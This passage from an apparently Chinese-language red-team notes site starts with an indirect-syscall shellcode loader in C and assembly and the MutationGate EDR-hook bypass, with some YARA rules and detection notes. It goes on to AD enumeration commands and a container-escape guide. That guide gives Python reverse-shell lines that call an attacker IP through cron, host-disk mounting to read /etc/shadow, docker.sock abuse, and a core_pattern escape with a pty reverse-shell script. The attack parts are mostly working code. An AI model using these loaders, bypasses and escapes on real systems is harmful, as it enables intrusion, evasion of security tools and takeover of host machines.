*(PLIST_ENTRY*)((PBYTE)ldr + 0x30); *ntdll = *(HMODULE*)((PBYTE)ntdlllistentry + 0x10); PLIST_ENTRY kernelbaselistentry = *(PLIST_ENTRY*)((PBYTE)ntdlllistentry); PLIST_ENTRY kernel32listentry = *(PLIST_ENTRY*)((PBYTE)kernelbaselistentry); *kernel32 = *(HMODULE*)((PBYTE)kernel32listentry + 0x10); } UINT_PTR GetSyscallAddr(IN HMODULE hModule, const CHAR* funcName) { PBYTE pBase = (PBYTE)hModule; UINT_PTR syscall; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; if (pImgDosHdr-\u0026gt;e_magic != IMAGE_DOS_SIGNATURE) return 0; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); if (pImgNtHdrs-\u0026gt;Signature != IMAGE_NT_SIGNATURE) return 0; IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNames); PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-\u0026gt;AddressOfFunctions); PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-\u0026gt;AddressOfNameOrdinals); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]); PBYTE pFunctionAddress = (PBYTE)(pBase + FunctionAddressArray[FunctionOrdinalArray[i]]); if (_stricmp(funcName, pFunctionName) == 0) { syscall = (UINT_PTR)(pFunctionAddress + 0x12); return syscall; } } return 0; } int main() { HMODULE ntdll; HMODULE kernel32; GetModule(\u0026amp;ntdll, \u0026amp;kernel32); printf(\u0026#34;ntdll base address: %p\\n\u0026#34;, ntdll); printf(\u0026#34;kernel32 base address: %p\\n\u0026#34;, kernel32); syscall_addr1 = GetSyscallAddr(ntdll, \u0026#34;NtOpenProcess\u0026#34;); syscall_addr2 = syscall_addr1 + 0x20; syscall_addr3 = syscall_addr1 + 0x40; syscall_addr4 = syscall_addr1 + 0x60; syscall_addr5 = syscall_addr1 + 0x80; printf(\u0026#34;Address of syscall instruction is 0x%p\\n\u0026#34;, syscall_addr1); unsigned char code[] = \u0026#34;\\x48\\x31\\xd2\\x65\\x48\\x8b\\x42\\x60\\x48\\x8b\\x70\\x18\\x48\\x8b\\x76\\x20\\x4c\\x8b\\x0e\\x4d\\x8b\\x09\\x4d\\x8b\\x49\\x20\\xeb\\x63\\x41\\x8b\\x49\\x3c\\x4d\\x31\\xff\\x41\\xb7\\x88\\x4d\\x01\\xcf\\x49\\x01\\xcf\\x45\\x8b\\x3f\\x4d\\x01\\xcf\\x41\\x8b\\x4f\\x18\\x45\\x8b\\x77\\x20\\x4d\\x01\\xce\\xe3\\x3f\\xff\\xc9\\x48\\x31\\xf6\\x41\\x8b\\x34\\x8e\\x4c\\x01\\xce\\x48\\x31\\xc0\\x48\\x31\\xd2\\xfc\\xac\\x84\\xc0\\x74\\x07\\xc1\\xca\\x0d\\x01\\xc2\\xeb\\xf4\\x44\\x39\\xc2\\x75\\xda\\x45\\x8b\\x57\\x24\\x4d\\x01\\xca\\x41\\x0f\\xb7\\x0c\\x4a\\x45\\x8b\\x5f\\x1c\\x4d\\x01\\xcb\\x41\\x8b\\x04\\x8b\\x4c\\x01\\xc8\\xc3\\xc3\\x41\\xb8\\x98\\xfe\\x8a\\x0e\\xe8\\x92\\xff\\xff\\xff\\x48\\x31\\xc9\\x51\\x48\\xb9\\x63\\x61\\x6c\\x63\\x2e\\x65\\x78\\x65\\x51\\x48\\x8d\\x0c\\x24\\x48\\x31\\xd2\\x48\\xff\\xc2\\x48\\x83\\xec\\x28\\xff\\xd0\u0026#34;; LPVOID allocation_start; SIZE_T allocation_size = sizeof(code); HANDLE hThread; NTSTATUS status; allocation_start = nullptr; // Allocate Virtual Memory if (NtAllocateVirtualMemory(GetCurrentProcess(), \u0026amp;allocation_start, 0, (PULONG64)\u0026amp;allocation_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) == 0) printf(\u0026#34;Memory allocated at %p\\n\u0026#34;, allocation_start); else printf(\u0026#34;Allocated failed, Error code is %d\\n\u0026#34;, GetLastError()); // Copy shellcode into allocated memory if (NtWriteVirtualMemory(GetCurrentProcess(), allocation_start, code, sizeof(code), 0) == 0) printf(\u0026#34;Copied successfully\\n\u0026#34;); else printf(\u0026#34;Copied failed, Error code is %d\\n\u0026#34;, GetLastError()); if (NtCreateThreadEx(\u0026amp;hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)allocation_start, NULL, FALSE, NULL, NULL, NULL, NULL) == 0) printf(\u0026#34;Executed successfully\\n\u0026#34;); else printf(\u0026#34;Executed failed, Error code is %d\\n\u0026#34;, GetLastError()); // Wait for the end of the thread and close the handle NtWaitForSingleObject(hThread, FALSE, NULL); NtClose(hThread); return 0; } stub.asm 代码：\nEXTERN syscall_addr1:QWORD EXTERN syscall_addr2:QWORD EXTERN syscall_addr3:QWORD EXTERN syscall_addr4:QWORD EXTERN syscall_addr5:QWORD .code NtAllocateVirtualMemory PROC mov r10, rcx mov rax, 18h jmp QWORD PTR [syscall_addr1] ret NtAllocateVirtualMemory ENDP NtWriteVirtualMemory PROC mov r10, rcx mov rax, 3Ah jmp QWORD PTR [syscall_addr2] ret NtWriteVirtualMemory ENDP NtCreateThreadEx PROC mov r10, rcx mov rax, 0C2h jmp QWORD PTR [syscall_addr3] ret NtCreateThreadEx ENDP NtWaitForSingleObject PROC mov r10, rcx mov rax, 4 jmp QWORD PTR [syscall_addr4] ret NtWaitForSingleObject ENDP NtClose PROC mov r10, rcx mov rax, 0Fh jmp QWORD PTR [syscall_addr5] ret NtClose ENDP end 我们在 C 代码里定义了全局变量 syscall_addr，因为该项目实际上还是 C++ 项目，所以需要稍微注意一下格式。出于演示程序的成功执行目的，我选择了 5 个连续的 syscall 指令的地址，如果我们想有意地选择良性 NTAPI 的 syscall 指令地址，需要仔细斟酌一下选择哪些。\n作为小练习，请写出没有混淆 syscall stub 的情况下，采用间接 syscall 调用的程序的 yara 的检测规则。\nsyswhisper3 # syswhisper3 是对 syswhisper2 的改进，也可以自动生成我们上面编写的间接 syscall 的程序所需要的相关文件。因为原理差不多，就不做额外解释了。\n导入所需文件的步骤与 syswhisper2 一致，代码也可以复用之前的。编译后，执行结果如下：\n根据 asm 文件里的函数指令，可以创建相应的 yara 规则：\nrule syswhisper3 { meta: description = \u0026#34;Hunt for syswhispe3 generated asm code\u0026#34; strings: $s1 = {48 89 4c 24 08 48 89 54 24 10 4c 89 44 24 18 4c 89 4c 24 20 48 83 ec 28 b9 ?? ?? ?? ?? e8} $s2 = {48 83 c4 28 48 8b 4c 24 08 48 8b 54 24 10 4c 8b 44 24 18 4c 8b 4c 24 20 4c 8b d1} condition: #s1 \u0026gt;=1 or #s2 \u0026gt;=1 } 因为我们导出了所有 NTAPI 的相关文件，匹配数自然很多。\n突变之门 MutationGate # 突变之门 MutationGate 是我在近期的研究成果，其实也是属于间接 syscall 的一种。但毕竟是作者我提出的，所以必须给足牌面，单独安排一个中标题。Github 地址: https://github.com/senzee1984/MutationGate 以及英文研究文章: https://winslow1984.com/books/malware/page/mutationgate\nMutationGate 通过利用硬件断点来重定向系统调用，从而绕过 EDR 的内联 hook。MutationGate 的原理是调用一个未被 hook 的良性 NTAPI，并用被 hook 的 NTAPI的 SSN 替换这个未被 hook 的 NTAPI 的 SSN。通过这种方式，syscall 被重定向到被 hook 的 NTAPI，而无需加载第 2 个 ntdll 模块或纂改已加载到内存中的 ntdll 模块，就可以绕过内联 hook。\nEDR 倾向于为一些 NTAPI 设置内联 hook，特别是那些常在恶意软件中被利用的，如 NtAllocVirtualMemory。而不常被恶意软件利用的 NTAPI 往往不会被 hook，如 NtDrawText。EDR hook 所有 NTAPI 的可能性非常小。\n假设 NTAPI NtDrawText 没有被 hook，而 NtQueryInformationProcess 被 hook 了，步骤如下：\n1. 获得 NtDrawText 的地址，通过 GetModuleHandle 与 GetProcAddress 组合，或者 PEB Walking 与导出表解析。\npNTDT = GetFuncByHash(ntdll, 0xA1920265); //NtDrawText hash pNTDTOffset_8 = (PVOID)((BYTE*)pNTDT + 0x8); //Offset 0x8 from NtDrawText 2. 为 NtQueryInformationProcess 准备相应参数。\n3. 在 NtDrawText + 0x8 处设置硬件断点，当执行流程到达这里时，SSN 已经存储在 RAX 中了，但 syscall 还未发起。\n0:000\u0026gt; u 0x00007FFBAD00EB68-8 ntdll!NtDrawText: 00007ffb`ad00eb60 4c8bd1 mov r10,rcx 00007ffb`ad00eb63 b8dd000000 mov eax,0DDh 00007ffb`ad00eb68 f604250803fe7f01 test byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1 00007ffb`ad00eb70 7503 jne ntdll!NtDrawText+0x15 (00007ffb`ad00eb75) 00007ffb`ad00eb72 0f05 syscall 00007ffb`ad00eb74 c3 ret 00007ffb`ad00eb75 cd2e int 2Eh 00007ffb`ad00eb77 c3 ret 4. 获取 NtQueryInformationProcess 的 SSN。在异常句柄里，用 NtQueryInformationProcess 的 SSN 替换 NtDrawText 的。\n...\u0026lt;SNIP\u0026gt;... uint32_t GetSSNByHash(PVOID pe, uint32_t Hash) { PBYTE pBase = (PBYTE)pe; PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase; PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr-\u0026gt;e_lfanew); IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdrs-\u0026gt;OptionalHeader; DWORD exportdirectory_foa = RvaToFileOffset(pImgNtHdrs, ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + exportdirectory_foa); //Calculate corresponding offset PDWORD FunctionNameArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-\u0026gt;AddressOfNames)); PDWORD FunctionAddressArray = (PDWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-\u0026gt;AddressOfFunctions)); PWORD FunctionOrdinalArray = (PWORD)(pBase + RvaToFileOffset(pImgNtHdrs, pImgExportDir-\u0026gt;AddressOfNameOrdinals)); for (DWORD i = 0; i \u0026lt; pImgExportDir-\u0026gt;NumberOfFunctions; i++) { CHAR* pFunctionName = (CHAR*)(pBase + RvaToFileOffset(pImgNtHdrs, FunctionNameArray[i])); DWORD Function_RVA = FunctionAddressArray[FunctionOrdinalArray[i]]; if (Hash == ROR13Hash(pFunctionName)) { void *ptr = malloc(10); if (ptr == NULL) { perror(\u0026#34;malloc failed\u0026#34;); return -1; } unsigned char byteAtOffset5 = *((unsigned char*)(pBase + RvaToFileOffset(pImgNtHdrs, Function_RVA)) + 4); //printf(\u0026#34;Syscall number of function %s is: 0x%x\\n\u0026#34;, pFunctionName,byteAtOffset5); //0x18 free(ptr); return byteAtOffset5; } } return 0x0; } ...\u0026lt;SNIP\u0026gt;... 5. 我们调用 NtDrawText 函数，但准备的却是 NtQueryInformationProcess 的参数，这个调用原本会失败的。但因为我们偷梁换柱了 SSN，调用会成功。\nfnNtQueryInformationProcess pNTQIP = (fnNtQueryInformationProcess)pNTDT; NTSTATUS status = pNTQIP(pi.hProcess, ProcessBasicInformation, \u0026amp;pbi, sizeof(PROCESS_BASIC_INFORMATION), NULL); 这个案例中，NtDrawText 的 SSN 为 0xdd，而 NtQueryInformationProcess 的 SSN 为 0x19，NtDrawText 的地址为 0x00007FFBAD00EB60\n这个调用是发起到 NtDrawText 的地址，但准备的是 NtQueryInformationProcess 的参数，因为 SSN 从 0xdd 变为了 0x19，syscall 自然是成功的。\n我们用之前的 yara 规则来扫描该 POC 程序，并没有发现符合的记录，这是当然的。\n但破绽也是有的，为了便于观察，以 SleepEx 的 NTAPI NtDelayExecution 为例，syscall 是在 ntdll 空间里发起的，看起来还算合理。然而，ntoskrnl 里的 KeDelayExecutionThread 期望的是 NtDelayExecution 发起 syscall，而不是 NtDrawText。这个破绽可以作为检测点。\n优势与检测 # MutationGate 相比其他类似的 unhook 方案具有一定的优势，尽管依旧是可能检测的。\n优势 # 不加载第 2 个 ntdll 模块 不纂改已加载的 ntdll 模块 不使用自定义的 syscall stub，因此没有对应的字节序列特征 syscall 发生在 ntdll 模块中，看起来是合理的 可能的检测方法 # 在正常程序中，调用 AddVectoredExceptionHandler 有些可疑 从内核层检视调用栈，ntoskrnl.exe 中执行的函数与 ntdll 模块中执行的函数不一致 在良性 NTAPI 中发起的 syscall 不会期望得到不属于自身的 SSN 与其他类似方法的对比 # HWSyscall(https://github.com/Dec0ne/HWSyscalls) 和 TamperingSyscall(https://github.com/rad9800/TamperingSyscalls) 都巧妙地利用硬件断点来绕过内联 hook，都是出色的方法。尽管在我获得灵感并发布 MutationGate 的期间里，我没有阅读和引用这两个项目，但的确利用了一些相似的技术和中心思想。我仔细阅读和研究了它们，并用表格总结与比较，如下所示：\n作为一个课后练习，请基于该 POC，用 MutationGate 的方法执行 calc 的 shellcode。\n"},{"id":9,"href":"/docs/%E5%85%B6%E4%BB%96/HVV%E9%9D%A2%E8%AF%95/","title":"Hvv面试","section":"Docs","content":" HVV面试 # OWASP TOP 10 # SQL 注入 失效的身份认证 敏感数据泄露 XML 外部实体（XXE） 失效的访问控制 安全配置错误 跨站脚本（XSS） 不安全的反序列化 使用含有已知漏洞的组件 不足的日志记录和监控\nLinux 提权 # 内核漏洞 SUID SUDO 计划任务 Capabilities 位提权 PEASS-ng（自动化提权脚本）\nWindows 提权 # 系统内核溢出漏洞提权 数据库提权 错误的系统配置提权 组策略首选项提权\n"},{"id":10,"href":"/docs/%E5%85%B6%E4%BB%96/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/","title":"解决ubuntu Crontab反弹shell失败的问题","section":"Docs","content":" 解决ubuntu-crontab反弹shell失败的问题 # https://m3lon.github.io/2019/03/18/%E8%A7%A3%E5%86%B3ubuntu-crontab%E5%8F%8D%E5%BC%B9shell%E5%A4%B1%E8%B4%A5%E7%9A%84%E9%97%AE%E9%A2%98/#more\n"},{"id":11,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/ADSEC101/","title":"Adsec101","section":"Docs","content":" ADSec101 # https://redteaming.net/pages/4e65fc/\n"},{"id":12,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Kerbrute/","title":"Kerbrute","section":"Docs","content":" Kerbrute # 通过Kerberos pre-auth进行用户枚举和口令爆破 # 渗透技巧——通过Kerberos pre-auth进行用户枚举和口令爆破\n"},{"id":13,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/KeyTab/","title":"Key Tab","section":"Docs","content":" KeyTab # KeyTab 是 Kerberos 的密钥表，用于存储 Kerberos 的密钥。\n存放位置 # Linux: /etc/krb5.keytab 提取信息 # https://github.com/sosdave/KeyTabExtract\n"},{"id":14,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/runas/","title":"Runas","section":"Docs","content":" runas命令 # runas命令是Windows系统中的一个命令，用于以其他用户的身份运行程序。在运行runas命令时，系统会提示输入目标用户的密码，输入正确的密码后，系统会以目标用户的身份运行指定的程序。\nrunas命令的语法如下：\nrunas /user:username program 在域中，可以使用/netonly参数指定以域用户的身份运行程序，例如：\nrunas /netonly /user:domain\\username program "},{"id":15,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/Windows%E5%86%85%E9%83%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"Windows内部信息收集","section":"Docs","content":" Windows内部信息收集 # query user || qwinsta 查看当前在线用户\nnet user 查看本机用户\nnet user /domain 查看域用户\nnet view \u0026amp; net group \u0026quot;domain computers\u0026quot; /domain 查看当前域计算机列表 第二个查的更多\nnet view /domain 查看有几个域\nnet view \\\\\\\\dc 查看 dc 域内共享文件\nnet group /domain 查看域里面的组\nnet group \u0026quot;domain admins\u0026quot; /domain 查看域管\nnet localgroup administrators /domain /这个也是查域管，是升级为域控时，本地账户也成为域管\nnet group \u0026quot;domain controllers\u0026quot; /domain 域控\nnet time /domain\nnet config workstation 当前登录域 - 计算机名 - 用户名\nnet use \\\\\\\\域控(如pc.xx.com) password /user:xxx.com\\username 相当于这个帐号登录域内主机，可访问资源\nipconfig\nsysteminfo\ntasklist /svc\ntasklist /S ip /U domain\\username /P /V 查看远程计算机 tasklist\nnet localgroup administrators \u0026amp;\u0026amp; whoami 查看当前是不是属于管理组\nnetstat -ano\nnltest /dclist:xx 查看域控\nwhoami /all 查看 Mandatory Label uac 级别和 sid 号\nnet sessoin 查看远程连接 session (需要管理权限)\nnet share 共享目录\ncmdkey /l 查看保存登陆凭证\necho %logonserver% 查看登陆域\nspn –l administrator spn 记录\nset 环境变量\ndsquery server 查找目录中的 AD DC/LDS 实例\ndsquery user 查找目录中的用户\ndsquery computer 查询所有计算机名称 windows 2003\ndir /s *.exe 查找指定目录下及子目录下没隐藏文件\narp -a\n"},{"id":16,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E5%B1%80%E5%9F%9F%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","title":"局域网信息收集","section":"Docs","content":" 局域网信息收集 # 枚举主机并识别域控制器 # https://notes.benheater.com/books/active-directory/page/enumerating-hosts-and-identifying-the-domain-controllers\n内部网络 sudo nmap -Pn -p- -T4 -A -oN nmap-scan.txt -iL targets.txt 外部网络（考虑上传nmap） # -sT : Use TCP full connect flag due to scanning through a proxy # --top-ports 1000 : Top 1,000 ports due to slow speeds with TCP full connect scanning sudo proxychains -q nmap -Pn -sT --top-ports 1000 -T4 -A -oN nmap-scan.txt -iL targets.txt 当您查看域控制器时，它的运行服务非常明显；类似于这样：\nPORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl ldap-rootdse | LDAP 根 DSE 信息 # 每个目录服务器都有一个名为 RootDSE 的唯一条目。 它提供服务器的相关数据，例如其功能、支持的 LDAP 版本以及使用的命名上下文。\n根DSE是LDAP服务器目录信息树顶部的条目。 LDAP服务器中的所有命名上下文（namingcontexts (suffixes，后缀)）直接位于根DSE下方。 根DSE包含有关LDAP服务器的信息，包括已配置的命名上下文和服务器的功能。\n内部网络 # Assumes 10.10.10.2 is the DC based on port enumeration sudo nmap -Pn -T4 -p 389,636 --script ldap-rootdse 10.10.10.2 | grep dnsHostName | sort -u 外部网络 # Via Proxy Host # Assumes 10.10.10.2 is the DC based on port enumeration sudo proxychains -q nmap -Pn -T4 -sT -p 389,636 --script ldap-rootdse 10.10.10.2 | grep dnsHostName | sort -u RID Cycling to Enumerate Users | RID 循环枚举用户 # 前提：允许空会话\n根据此文章反向操作开启空会话： How to Disable Null Session in Windows\nenum4linux -a -r -K 5000 10.80.80.2 Anonymous LDAP Queries | 匿名 LDAP 查询 # ldapsearch -x -H ldap://10.80.80.2 -D \u0026#39;CN=anonymous,DC=ad,DC=lab\u0026#39; -W -b \u0026#39;DC=ad,DC=lab\u0026#39; \u0026#39;objectClass=user\u0026#39; | grep -i \u0026#39;sAMAccountName\u0026#39; 以“anonymous@ad.lab”身份进行身份验证，当提示输入密码时，按 Enter\nkerbrute | Kerberos 爆破 # 枚举用户名 # kerbrute userenum --dc ad.lab -d ad.lab /usr/share/wordlists/rockyou.txt "},{"id":17,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/IPC/","title":"IP C","section":"Docs","content":" IPC # IPC$的概念 # IPC$(Internet Process Connection)是共享“命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。\nIPC$的作用 # 利用IPC$，连接者可以与目标主机建立一个连接，利用这个连接，连接者可以得到目标主机上的目录结构、用户列表等信息。\n"},{"id":18,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/AD%E5%9F%9F/%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99/","title":"相关资料","section":"Docs","content":" Active Directory 相关资料 # Active Directory Book\nActive Directory Attack Path \u0026amp; VMs\nHackTricks - Active Directory Methodology\n"},{"id":19,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E4%BB%A3%E7%90%86%E8%BD%AC%E5%8F%91/","title":"代理转发","section":"Docs","content":" 代理转发 # https://www.freebuf.com/articles/web/256415.html\nstowaway # 用法\nhttps://blog.csdn.net/qq_44159028/article/details/129681017\nNeo-reGeorg # https://github.com/L-codes/Neo-reGeorg\n"},{"id":20,"href":"/docs/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/","title":"容器逃逸","section":"Docs","content":" 容器逃逸 # 识别docker容器 # 1. 检查根目录下是否存在.dockerenv文件 # ls -al / | grep .dockerenv 2. 检查 /proc/1/cgroup 是否存在含有docker字符串 # cat /proc/1/cgroup | grep docker 逃逸方式 # Container Escape: All You Need is Cap (Capabilities) # https://www.cybereason.com/blog/container-escape-all-you-need-is-cap-capabilities\nHackTricks - Docker Breakout / Privilege Escalation # https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation\n〇. 使用工具：CDK # https://github.com/cdk-team/CDK\n一. Docker Remote API未授权访问逃逸 # https://blog.csdn.net/qq_64973687/article/details/132187299\n基础知识 # Docker Remote API 是一个取代远程命令行界面（rcli）的REST API，其默认绑定2375端口，如管理员对其配置不当可导致未授权访问漏洞。\ndockerd -H=0.0.0.0:2375 -H unix:///var/run/docker.sock 攻击者利用 docker client 或者 http 直接请求就可以访问这个 API，可导致敏感信息泄露，甚至可进一步利用Docker自身特性，借助容器逃逸，最终完全控制宿主服务器\nDocker daemon 是 Docker 引擎的后台进程，也称为 Dockerd。它是一个长时间运行的进程，负责管理 Docker 镜像、容器、网络和存储等各种资源，并提供一个 API 以供 Docker 客户端进行交互\n当您在 Docker 主机上使用 Docker 命令时（例如 docker run），Docker 客户端将向 Docker daemon 发送命令请求，并通过 Docker API 进行通信。Docker daemon 接收并解析这些请求，并在其内部管理对象存储中创建、修改或删除相应的 Docker 资源。随后，Docker daemon 将响应结果发送回客户端，然后等待下一个命令请求\n另外，Docker daemon 也负责监视 Docker 主机上正在运行的容器和服务，以及处理与 Docker 网络和存储相关的操作。它还可以与其他 Docker daemon 进行通信，以实现跨主机的镜像和容器管理。总之，Docker daemon 是整个 Docker 引擎的核心组件，负责实现 Docker 的各种功能，并将其暴露给用户和其他程序使用\n漏洞验证 # 访问 http 请求 curl $宿主机IP:2375/info，如果返回内容含有DockerRootDir等字符，则证明存在docker未授权访问漏洞\ncurl $宿主机IP:2375/info | grep DockerRootDir 漏洞利用 # docker -H tcp://$宿主机IP:2375 ps -a 新运行一个容器，挂载点设置为服务器的根目录挂载至/mnt目录下，此时修改/mnt/etc/crontab相当于修改/etc/crontab文件\ndocker -H tcp://$宿主机IP:2375 run -it -v /:/mnt nginx:latest /bin/bash 在容器内执行命令，将反弹shell的脚本写入到/etc/crontab文件\necho -e \u0026#34;* * * * * root /usr/bin/python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;$攻击机IP\\\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\\n\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab 二. privileged特权模式启动容器逃逸 # https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html\nhttps://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged\n漏洞环境 # docker run -itd --privileged ubuntu /bin/bash 漏洞判断 # 判断是否是特权模式启动，如果是以特权模式启动的话，CapEff对应的掩码值应该为0000003fffffffff。\ncat /proc/self/status |grep CapEff 漏洞利用 # 方法一：磁盘挂载 # 在docker容器中查看系统磁盘分区情况，在新建一个目录，将宿主机所在磁盘挂载到新建的目录中。\nfdisk -l mkdir /mnt mount /dev/sda1 /mnt 尝试访问宿主机 shadow 文件\ncat /mnt/etc/shadow 写入定时任务反弹shell（不同系统可能路径不同）\necho -e \u0026#34;* * * * * root /usr/bin/python -c \u0026#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\u0026#34;$攻击机IP\\\u0026#34;,8888));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\u0026#34;/bin/sh\\\u0026#34;,\\\u0026#34;-i\\\u0026#34;]);\u0026#39;\\n\u0026#34; \u0026gt;\u0026gt; /mnt/etc/crontab 方法二：通过新添加的用户登录 # mount /dev/sda1 /mnt chroot /mnt adduser john 其他方法 # https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation#privileged--hostpid\n三. 危险挂载导致Docker逃逸 # 挂在了根目录到容器内，容器内可以直接修改宿主机文件\n漏洞利用同上\n四. 挂载Docker Socket逃逸 # 在启动docker容器时，将宿主机/var/run/docker.sock文件挂载到docker容器中，在docker容器中，也可以操作宿主机的docker。\n漏洞验证 # find / -name docker.sock 漏洞利用 # 在docker容器中安装docker\napt-get update apt-get install docker.io 使用命令查看宿主机拉取的镜像。\ndocker -H unix://var/run/docker.sock images 在docker容器中，使用命令再运行一个docker容器,将宿主机的根目录挂载到ubuntu的test目录中，造成docker逃逸，在通过写计划任务方式，反弹shell，具体同上\ndocker -H unix://var/run/docker.sock run -v /:/test -it ubuntu /bin/bash ls /test 五. 挂载宿主机procfs逃逸 # https://www.freebuf.com/articles/system/383583.html\n挂载宿主机的 procfs 文件系统通常是为了让容器可以访问主机的进程信息。然而，在某些情况下，滥用挂载 procfs 可能导致容器逃逸，即容器能够访问宿主机上其他进程的敏感信息。在 Docker 中，默认情况下，容器内的 procfs 文件系统被挂载为只读。因此，容器内的进程只能查看自己的进程信息，无法访问宿主机的 procfs。这有助于提高容器的隔离性和安全性。然而，如果在创建容器时显式地将宿主机的 procfs 挂载为可读写，或者容器内的进程具有容器特权（例如，使用特权模式运行容器），那么容器就有可能滥用 procfs 功能，以获取宿主机上其他进程的敏感信息。\nprocfs中的/proc/sys/kernel/core_pattern负责配置进程崩溃时内存转储数据的导出方式，如果/proc/sys/kernel/core_pattern文件中的首个字符是管道符| ，那么该行的剩余内容将被当作用户空间程序或脚本解释并执行。当利用这种方式进行docker逃逸时，触发条件比较苛刻，需要有进程奔溃才能触发\n漏洞环境 # docker run -it -v /proc/sys/kernel/core_pattern:/host/proc/sys/kernel/core_pattern ubuntu 漏洞验证 # 如果找到两个core_pattern文件，那可能就是挂载了宿主机的procfs。\nfind / -name core_pattern 漏洞利用 # 方法一：手动 # 当启动一个容器时，会在/var/lib/docker/overlay2目录下生成一层容器层，容器层里面包括diff、link、lower、merged、work目录，而docker容器的目录保存在merged目录中，通过命令找到当前容器在宿主机下的绝对路径，workdir代表的是docker容器在宿主机中的绝对路径。\ncat /proc/mounts | xargs -d \u0026#39;,\u0026#39; -n 1 | grep workdir 假设当前绝对路径为\n/var/lib/docker/overlay2/5a622d02ad5431399339448ce6ae7a2b7bd6107e9dd5408c76770c1b89ea1a02/merged\n向容器内/host/proc/sys/kernel/core_pattern写入以下内容\necho -e \u0026#34;|/var/lib/docker/overlay2/5a622d02ad5431399339448ce6ae7a2b7bd6107e9dd5408c76770c1b89ea1a02/merged/tmp/.x.py \\rcore \u0026#34; \u0026gt; /host/proc/sys/kernel/core_pattern 然后在容器内创建一个反弹shell /tmp/.x.py\ncat \u0026gt;/tmp/.x.py \u0026lt;\u0026lt; EOF # !/usr/bin/python import os import pty import socket lhost = \u0026#34;attacker-ip\u0026#34; lport = 10000 def main(): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((lhost, lport)) os.dup2(s.fileno(), 0) os.dup2(s.fileno(), 1) os.dup2(s.fileno(), 2) os.putenv(\u0026#34;HISTFILE\u0026#34;, \u0026#39;/dev/null\u0026#39;) pty.spawn(\u0026#34;/bin/bash\u0026#34;) os.remove(\u0026#39;/tmp/.x.py\u0026#39;) s.close() if __name__ == \u0026#34;__main__\u0026#34;: main() EOF chmod +x /tmp/.x.py 